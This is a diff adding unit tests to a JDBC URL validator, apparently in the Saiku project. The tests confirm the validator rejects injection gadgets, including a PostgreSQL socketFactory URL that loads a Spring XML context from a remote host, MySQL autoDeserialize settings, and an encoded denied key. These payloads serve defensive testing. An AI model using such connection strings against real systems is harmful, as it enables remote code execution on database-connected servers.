@@ -131,6 +131,51 @@ public class JdbcUrlValidatorTest {
         assertRejected("jdbc:h2:mem:x;shutdown");
     }
 
+    /* ---- saiku#1902: the façade now delegates to JdbcUrlPolicy, so the non-H2 gadget ---- */
+    /* ---- families are refused at the REST edge too (the service chokepoint is authoritative). */
+
+    @Test
+    public void rejectsPostgresSocketFactoryGadget() {
+        assertRejected(
+                "jdbc:postgresql://h/db?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext"
+                        + "&socketFactoryArg=http://e/ctx.xml");
+    }
+
+    @Test
+    public void rejectsPostgresSocketFactoryGadgetInsideMondrianWrapper() {
+        assertRejected("jdbc:mondrian:Jdbc=jdbc:postgresql://h/db?socketFactory=x.Y&socketFactoryArg=z;"
+                + "Catalog=mondrian://Foodmart;JdbcDrivers=org.postgresql.Driver");
+    }
+
+    @Test
+    public void rejectsMysqlAutoDeserialize() {
+        assertRejected("jdbc:mysql://h/db?autoDeserialize=true&queryInterceptors=x.Y");
+    }
+
+    @Test
+    public void rejectsPercentEncodedDeniedKey() {
+        assertRejected("jdbc:postgresql://h/db?socket%46actory=x");
+    }
+
+    @Test
+    public void rejectsUnknownScheme() {
+        assertRejected("jdbc:evil://h/db");
+    }
+
+    @Test
+    public void rejectsCalciteInlineModel() {
+        assertRejected("jdbc:calcite:model=inline:{\"schemas\":[]}");
+    }
+
+    @Test
+    public void acceptsOrdinaryNonH2Backends() {
+        JdbcUrlValidator.validate("jdbc:mysql://h/db?useSSL=true");
+        JdbcUrlValidator.validate("jdbc:sqlserver://h:1433;databaseName=db;encrypt=true");
+        JdbcUrlValidator.validate("jdbc:trino://h:8090/iceberg/sales?user=saiku");
+        JdbcUrlValidator.validate(
+                "jdbc:mondrian:Jdbc=jdbc:mysql://h/db;Catalog=mondrian://Foodmart;JdbcDrivers=com.mysql.cj.jdbc.Driver");
+    }
+
     private static void assertRejected(String url) {
         try {
             JdbcUrlValidator.validate(url);
